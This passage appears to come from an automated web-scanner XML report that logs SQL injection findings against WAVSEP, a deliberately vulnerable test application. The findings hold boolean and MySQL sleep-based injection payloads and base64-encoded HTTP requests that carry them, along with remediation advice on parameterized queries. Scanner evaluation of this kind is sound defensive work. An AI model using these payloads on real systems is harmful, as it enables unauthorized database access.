      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTExLUluamVjdGlvbkluVmlldy1EYXRlLVBlcm1pc3Npb25CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3A/dHJhbnNhY3Rpb25EYXRlPTIwMTAtMDEtMDEnJTJiKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpJTJiJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMFZhbGlkL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjU4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MjENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTEgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBwcml2YXRlIHJlc291cmNlIHZpZXcgcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2816906639651238912</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case12-InjectionInSearch-Date-UnionExploit-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case12-InjectionInSearch-Date-UnionExploit-WithDifferent200Responses.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>' and '5290'='5290</b> and <b>' and '6122'='6129</b> were each submitted in the transactionDate parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the transactionDate parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTEyLUluamVjdGlvbkluU2VhcmNoLURhdGUtVW5pb25FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyUyMGFuZCUyMCc1MjkwJyUzZCc1MjkwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA2MDANCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTIgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBzZWFyY2ggcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEzMgo8L1REPgo8VEQ+CjEwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTEyLUluamVjdGlvbkluU2VhcmNoLURhdGUtVW5pb25FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyUyMGFuZCUyMCc2MTIyJyUzZCc2MTI5IEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MDYNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTIgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBzZWFyY2ggcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTEyLUluamVjdGlvbkluU2VhcmNoLURhdGUtVW5pb25FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYicgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBWYWxpZC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjU5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MDYNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTIgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBzZWFyY2ggcGFnZSB3aXRoIGRpZmZlcmVudCB2YWxpZCByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8860616148113160192</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case13-InjectionInCalc-Date-BooleanExploit-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case13-InjectionInCalc-Date-BooleanExploit-WithDifferent200Responses.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>' and '4363'='4363</b> and <b>' and '4236'='4239</b> were each submitted in the transactionDate parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the transactionDate parameter. The application took <b>20004</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTEzLUluamVjdGlvbkluQ2FsYy1EYXRlLUJvb2xlYW5FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyUyMGFuZCUyMCc0MzYzJyUzZCc0MzYzIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUxOjM5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTMgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhIGNhbGN1bGF0aW9uIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClNldmVyYWwgYWNjb3VudHMgbWF0Y2ggdGhlIGNyaXRlcmlhLgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTEzLUluamVjdGlvbkluQ2FsYy1EYXRlLUJvb2xlYW5FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwP3RyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyUyMGFuZCUyMCc0MjM2JyUzZCc0MjM5IEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
